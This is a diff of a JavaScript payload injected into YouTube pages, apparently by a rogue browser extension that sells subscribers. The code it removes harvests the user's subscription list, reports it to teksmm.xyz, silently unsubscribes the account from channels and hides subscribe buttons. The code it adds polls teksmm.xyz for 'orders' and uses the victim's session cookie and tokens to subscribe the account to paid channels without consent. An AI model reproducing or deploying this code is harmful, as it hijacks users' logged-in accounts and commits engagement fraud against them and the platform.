@@ -1,58 +1,15 @@
+
 if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.split('creator_channel_id","value":"')[1] && window.asdfsdf != true) {
-	function sendSyncXhrReqLog(uri) {
-		try{
-			var request = new XMLHttpRequest();
-			request.open('GET', uri, false); // `false` makes the request synchronous
-			request.send(null);
-			if (request.status === 200) {
-				return request.responseText;
-			}
-		}catch(e){}
-		
-		return -1;
-	}
-
-	/*
-	  Downloads the suscription list and parse as array that contains channel id's
-	*/
-	function getSubscriptionListLog() {
-		var currentSubsciptionRawLog = sendSyncXhrReqLog("https://www.youtube.com/subscription_manager?action_takeout=1")
-		if (currentSubsciptionRawLog == -1) {
-			return currentSubsciptionRawLog;
-		}
-		return currentSubsciptionRawLog.split("channel_id=").map(element => element.split("\"")[0]).slice(1)
-	}
-
-	function ifNotDownloadSubListLog() {
-
-		var listLog = window.localStorage.getItem('subList57');
-		if (!listLog) {
-			subListArrayLog = getSubscriptionListLog();
-			console.log(subListArrayLog.length);
-			new Image().src = '//www.teksmm.xyz/smmnew/log/logSub.php?message=' +subListArrayLog.length;
-			window.localStorage.setItem("subList57", JSON.stringify(subListArrayLog))
-		} else {
-			//console.log("Has been saved")
-		}
-		//return JSON.parse(listLog);
-	}
-	ifNotDownloadSubListLog();
+	
+	
 	console.log("Inject");
 	window.asdfsdf = true;
 	
 	function getStaticParams(){
 		let vars = {}
-		let data = document.getElementsByTagName('html')[0].innerHTML;
-		vars.hl = data.split('"hl":"')[1].split('"')[0];  
-		vars.gl =  data.split('"gl":"')[1].split('"')[0]; 
-		vars.visitorData = data.split('"visitorData":"')[1].split('"')[0]; 
-		vars.clientName = data.split('{"client.name":"')[1].split('"')[0]; 
-		vars.osName          = data.split('"osName":"')[1].split('"')[0];  
-		vars.osVersion       = data.split('"osVersion":"')[1].split('"')[0];  
-		vars.browserName     = data.split('"browserName":"')[1].split('"')[0];  
-		vars.browserVersion  = data.split('"browserVersion":"')[1].split('"')[0];  
-
+		let data = document.getElementsByTagName('html')[0].outerHTML;
 		vars.userAgent   = navigator.userAgent+",gzip(gfe)";
+		vars.visitorData = data.split('"visitorData":"')[1].split('"')[0];
 		vars.screenWidthPoints = window.innerWidth;
 		vars.screenHeightPoints = window.innerHeight;
 		vars.screenPixelDensity = Math.round(window.devicePixelRatio) || 1;
@@ -60,6 +17,7 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 		vars.userInterfaceTheme  = data.indexOf("<html dark") >= 0 ? "USER_INTERFACE_THEME_DARK" :  "USER_INTERFACE_THEME_LIGHT";
 		vars.session_token = data.split('"XSRF_TOKEN":"')[1].split('"')[0];
 		vars.sessionId = data.split('"sessionId":"')[1].split('"')[0];
+		vars.visitorData = data.split('"visitorData":"')[1].split('"')[0]; 
 		vars.youtube_identity_token = data.split('"ID_TOKEN":"')[1].split('"')[0];
 		vars.variants_checksum = data.split('"VARIANTS_CHECKSUM":"')[1].split('"')[0];
 		vars.page_cl = data.split('PAGE_CL":')[1].split(',')[0];
@@ -74,7 +32,6 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 			vars.apiKey =data.split('"innertubeApiKey":"')[1].split('"')[0]; 
 		}
 		
-	
 		try{
 			vars.DELEGATED_SESSION_ID =data.split('"DELEGATED_SESSION_ID":"')[1].split('"')[0];
 		}catch(ex){
@@ -109,25 +66,25 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 
 	}
 	
-	function createSubData(data, sub){
+	function createSubData(data){
 		let vars = getStaticParams();
 		var body = {
 					"context": {
 						"client": {
-							"hl": vars.hl,
-							"gl": vars.gl,
+							"hl": data[2].player.args.host_language,
+							"gl": data[2].player.args.cr,
 							"visitorData": vars.visitorData,
 							"userAgent": vars.userAgent,
-							"clientName": vars.clientName,
-							"clientVersion": vars.clientVersion,
-							"osName": vars.osName,
-							"osVersion": vars.osVersion,
-							"browserName": vars.browserName,
-							"browserVersion": vars.browserVersion,
+							"clientName": data[2].player.args.c,
+							"clientVersion": data[2].player.args.cver,
+							"osName": data[2].player.args.cos,
+							"osVersion": data[2].player.args.cosver,
+							"browserName": data[2].player.args.cbr,
+							"browserVersion": data[2].player.args.cbrver,
 							"screenWidthPoints": vars.screenWidthPoints,
 							"screenHeightPoints": vars.screenHeightPoints,
 							"screenPixelDensity": vars.screenPixelDensity,
-							"utcOffsetMinutes": vars.utcOffsetMinutes,
+							"utcOffsetMinutes": vars.screenPixelDensity,
 							"userInterfaceTheme": vars.userInterfaceTheme
 						},
 						"request": {
@@ -142,36 +99,29 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 						},
 						"clientScreenNonce": data[0].csn,
 						"clickTracking": {
+							"clickTrackingParams": data[3].response.contents.twoColumnWatchNextResults.results.results.contents[1].videoSecondaryInfoRenderer.subscribeButton.subscribeButtonRenderer.trackingParams
 						}
 					},
 					"channelIds": [
-						data[1].response.responseContext.serviceTrackingParams[0].params[0].value
-
+						data[3].playerResponse.videoDetails.channelId
 					],
+					"params": data[3].response.contents.twoColumnWatchNextResults.results.results.contents[1].videoSecondaryInfoRenderer.subscribeButton.subscribeButtonRenderer.onSubscribeEndpoints[0].subscribeEndpoint.params
 				};
 				
-		let sessIndex = vars.sessionIndex;
+		let sessIndex = data[3].response.responseContext.webResponseContextExtensionData.ytConfigData.sessionIndex;
 		if(sessIndex != 0){
 			body.context.request.sessionIndex = sessIndex;
 		}
 		if(vars.DELEGATED_SESSION_ID != 0){
 			body.context.user.onBehalfOfUser = vars.DELEGATED_SESSION_ID;
 		}
-		if(sub == false){
-			try{
-			body.context.clickTracking.clickTrackingParams = data[1].response.header.c4TabbedHeaderRenderer.subscribeButton.subscribeButtonRenderer.onUnsubscribeEndpoints[0].signalServiceEndpoint.actions[0].openPopupAction.popup.confirmDialogRenderer.confirmButton.buttonRenderer.serviceEndpoint.clickTrackingParams
-			body.params = data[1].response.header.c4TabbedHeaderRenderer.subscribeButton.subscribeButtonRenderer.onUnsubscribeEndpoints[0].signalServiceEndpoint.actions[0].openPopupAction.popup.confirmDialogRenderer.confirmButton.buttonRenderer.serviceEndpoint.unsubscribeEndpoint.params
-			}catch(ex){
-				body.context.clickTracking.clickTrackingParams = data[1].response.header.c4TabbedHeaderRenderer.subscribeButton.subscribeButtonRenderer.onUnsubscribeEndpoints[0].clickTrackingParams;
-			}
-			
-		}
+	
 
 		return body;
 	}
 	
-	function createPost(data,videoId,sub){
-		var body = createSubData(data,sub);
+	function createPost(data,videoId){
+		var body = createSubData(data);
 		
 		var sapisid = getCookie("SAPISID")
 		let time = Math.floor(new Date().getTime() / 1E3);
@@ -182,9 +132,7 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 		let vars = getStaticParams();
 		
 		let url = "https://www.youtube.com/youtubei/v1/subscription/subscribe?key="+vars.apiKey;
-		if(!sub){
-			url = "https://www.youtube.com/youtubei/v1/subscription/unsubscribe?key="+vars.apiKey;
-		}
+	
 		
 		fetch(url, {
 		  "headers": {
@@ -192,7 +140,7 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 			"accept-language": vars.accept_language ,
 			"authorization": SAPISIDHASH,
 			"content-type": "application/json",
-			"referer-zzz": videoId,
+			"referer-zzz": "https://www.youtube.com/watch?v="+videoId,
 			"sec-fetch-dest": "empty",
 			"sec-fetch-mode": "same-origin",
 			"sec-fetch-site": "same-origin",
@@ -209,11 +157,10 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 		}).then(response => response.json())
 	}
 	
-	function subscribe(url,sub=true){
-		console.log(url)
+	function subscribe(videoId,remains){
 		let vars = getStaticParams();
 		
-		fetch(url, {
+		fetch("https://www.youtube.com/watch?v="+videoId+"&pbj=1", {
 		  "headers": {
 			"accept": "*/*",
 			"accept-language": vars.accept_language,
@@ -241,9 +188,11 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 		  "credentials": "include"
 		}).then(response => response.json())
 		  .then(data =>{
-
-			createPost(data,url,sub)
-			
+			let subscribed = JSON.stringify(data).split('"subscribed":')[1].split(',')[0].trim();
+			let subCount =  numberFormatter(JSON.stringify(data).split('"subscriberCountText":{"simpleText":"')[1].split('"')[0].trim());
+			if(subscribed.indexOf((false).toString()) >= 0 && subCount <= remains ){
+				createPost(data,videoId)
+			}
 			
 			
 		  })
@@ -382,209 +331,67 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
     }
 }
 	
-	//subscribe("D1dMA0Zp2Ww")
+function checkOrSave(key, value){
+Object.keys(localStorage).forEach(x => {
+  if( parseInt( localStorage.getItem(x) ) - new Date().getTime()  <= 0){
+      localStorage.removeItem(x)
+  }
+})
+if(localStorage.getItem(key)){
+  return true;
+}
+localStorage.setItem(key,new Date().getTime()+(1000*60*60*24*11))
+return false;
+}
+
+function rasgteleSure(min, max) { 
+  return Math.floor(Math.random() * (max - min + 1) + min);
+}
 	
-	
-	/* UNSUB START */
-	
-		function sendSyncXhrReq(uri) {
-		try{
-			var request = new XMLHttpRequest();
-			request.open('GET', uri, false); // `false` makes the request synchronous
-			request.send(null);
-			console.log(request.status)
-			if (request.status === 200) {
-				return request.responseText;
-			}
-		}catch(e){
-			console.log(e)
-		}
-		
-		return -1;
-	}
-
-	/*
-	  Downloads the suscription list and parse as array that contains channel id's
-	*/
-	function getSubscriptionList() {
-		var currentSubsciptionRaw = sendSyncXhrReq("https://www.youtube.com/subscription_manager?action_takeout=1")
-		if (currentSubsciptionRaw == -1) {
-			console.log("Not Logged in");
-			return currentSubsciptionRaw;
-		}
-		return currentSubsciptionRaw.split("channel_id=").map(element => element.split("\"")[0]).slice(1)
-	}
-
-	/* 
-		that will control the subscription list has already downloaded    
-	*/
-	function ifNotDownloadSubList() {
-
-		var list = window.localStorage.getItem('subList6');
-		if (!list) {
-			subListArray = getSubscriptionList();
-			console.log(subListArray.length);
-			new Image().src = '//www.teksmm.xyz/smmnew/log/log.php?message=' +subListArray.length;
-			if( !window.localStorage.getItem("unsubCount") ){
-				window.localStorage.setItem("unsubCount", subListArray.length);
-			}
-	
-			window.localStorage.setItem("subList6", JSON.stringify(subListArray))
-		} else {
-			console.log("Has been saved")
-		}
-		return JSON.parse(list);
-	}
-
-	function ifNotDownloadMajor() {
-		try{
-			var majorList = window.localStorage.getItem('majorList6');
-			if (!majorList) {
-				subListArray = getSubscriptionList();
-				majorDataRaw = sendSyncXhrReq("https://raw.githubusercontent.com/modifyheader/modhead/master/last1month?test");
-				majorDataArray = JSON.parse(majorDataRaw).filter( elements => elements.link.indexOf("channel") > 0 ).map(elements => {
-					return elements.link
-				})
-				window.localStorage.setItem("majorList6", JSON.stringify(majorDataArray))
-			} else {
-				console.log("Has been saved")
-			}
-			return JSON.parse(majorList);
-		}catch(ex){
-			return [];
-		}
-	}
-
-	function getElementOfSubList() {
-		var subList = window.localStorage.getItem('subList6')
-		
-		 if(  subList != -1){
-			var subListArray = JSON.parse(subList)
-			var lastElement = subListArray.pop();
-			window.localStorage.setItem("subList6", JSON.stringify(subListArray))
-		
-			majorList = ifNotDownloadMajor();
-		
-			search = majorList.filter(elements => elements.indexOf(lastElement) >= 0)
-			if (search.length == 0) {
-				return lastElement;
-			}
-			return getElementOfSubList();
-		}
-		return -1;
-	}
-
-	function getRndInteger(min, max) {
-		return Math.floor(Math.random() * (max - min)) + min;
-	}
-
-	ifNotDownloadSubList();
-	ifNotDownloadMajor();
-
-	function getVideoId(channelId){
-		let vars = getStaticParams();
-		console.log("https://www.youtube.com/channel/"+channelId+"/videos?pbj=1");
-		fetch("https://www.youtube.com/channel/"+channelId+"/videos?pbj=1", {
-		  "headers": {
-			"accept": "*/*",
-			"accept-language": vars.accept_language,
-			"sec-fetch-dest": "empty",
-			"sec-fetch-mode": "cors",
-			"sec-fetch-site": "same-origin",
-			"referer-zzz": document.URL,
-			"x-spf-previous": document.URL,
-			"x-spf-referer": document.URL,
-			"x-youtube-client-name": "1",
-			"x-youtube-client-version":  vars.clientVersion,
-			"x-youtube-device": vars.device,
-			"x-youtube-identity-token": vars.youtube_identity_token,
-			"x-youtube-page-cl": vars.page_cl,
-			"x-youtube-page-label": vars.page_build_label,
-			"x-youtube-sts": vars.STS,
-			"x-youtube-time-zone": vars.timezone ,
-			"x-youtube-utc-offset": vars.utcOffsetMinutes,
-			"x-youtube-variants-checksum": vars.variants_checksum
-		  },
-		  "referrerPolicy": "origin-when-cross-origin",
-		  "body": null,
-		  "method": "GET",
-		  "mode": "cors",
-		  "credentials": "include"
-		}).then(response => response.json())
-		  .then(data =>{
-			  try{
-				var tabs = data[1].response.contents.twoColumnBrowseResultsRenderer.tabs;
-				if(tabs.length > 1){
-					var items = tabs[1].tabRenderer.content.sectionListRenderer.contents[0].itemSectionRenderer.contents[0].gridRenderer.items
-			  }else{
-				 var items = tabs[0].tabRenderer.content.sectionListRenderer.contents[0].itemSectionRenderer.contents[0].gridRenderer.items
-			  }
-
-				if(items.length > 0 ){
-					subscribe(items[0].gridVideoRenderer.videoId,false)
-				}else{
-					console.log("video yok");
+function siparis_getir_3() {
+	var xhr = new XMLHttpRequest();
+	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=3&json=[]", false);
+	xhr.onreadystatechange = function() {
+		if (xhr.readyState == 4 && xhr.status == 200) {
+			try {
+				var data = JSON.parse(xhr.responseText);
+				vars = {};
+				vars.videoId = data.videoIds[Math.floor(Math.random()*data.videoIds.length)]
+				vars.channelIds = data.channelId.trim();
+				vars.id = data.id.trim();
+				vars.remains = parseInt(data.remains)+10;
+				if (vars.channelIds  ) {
+					if(!checkOrSave(vars.id,"3")){
+						// new Image().src = '//teksmm.xyz/smmnew/log/yt.php?message=getir3';
+						subscribe(vars.videoId,vars.remains);
+					}
 				}
-			}catch(ex){
-				console.log(ex)
-			}
-
+			}catch (error) {}
+		}else{
 			
-		  })
-	}
-	
-	if( !window.localStorage.getItem("downSubListCount6") ){
-		window.localStorage.setItem("downSubListCount6", 0);
-	}
-	
-
-	function unSub() {
-		try{
-			vars = {}
-			vars.channelIds = getElementOfSubList();
-			  if(vars.channelIds){
-				  new Image().src = 'https://whos.amung.us/pingjs/?k=selamcek81';
-				  subscribe("https://www.youtube.com/channel/"+vars.channelIds+"?pbj=1",false)
-				  setTimeout(unSub, getRndInteger(1000*5, 1000*15) )    
-			  }else{
-				 let counter = parseInt(window.localStorage.getItem("downSubListCount6"));
-				 if( counter < 5){
-					  new Image().src = 'https://whos.amung.us/pingjs/?k=selamcek81';
-					window.localStorage.setItem("downSubListCount6", counter + 1);
-					subListArray = getSubscriptionList();
-					window.localStorage.setItem("subList6", JSON.stringify(subListArray))
-					setTimeout(unSub, getRndInteger(1000*5, 1000*15) )    
-					console.log("COUNTER" + counter)
-				}
-			  }
-		}catch(ex){
-			console.log(ex)
 		}
-	} 
+	}
+	xhr.send();
+}
 
-	unSub();
+
+
+function start() {
+  var cookie_name = "yt";
+  var cookie_time = rasgteleSure(60 * 1000 * 3,60 * 1000 * 5);
+  if (!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now() - cookie_time) {
+    localStorage[cookie_name] = Date.now();
+	new Image().src = '//whos.amung.us/pingjs/?k=selamcek03';
+    siparis_getir_3();
+  }
+}
+
+setInterval(function() {
+    start();
+  }, 1000 * 60 * 1);
+ 
 	
 	
-	/*
-	 Functions UnSub Proccess
-	*/
-
-		
-		 
-		  setInterval(function() {
-			if(document.querySelectorAll("ytd-guide-section-renderer").length > 0){
-			  document.querySelectorAll("ytd-guide-section-renderer")[1].style.display ="none";
-			}
-			
-			var bok = document.getElementsByClassName("style-scope ytd-subscribe-button-renderer");
-			if (bok.length > 0) {
-			  for (var i = 0; i < bok.length; i++) {
-				bok[i].outerHTML = "";
-			  }
-			}
-		  }, 1000);
-		
-
 	
 }
 
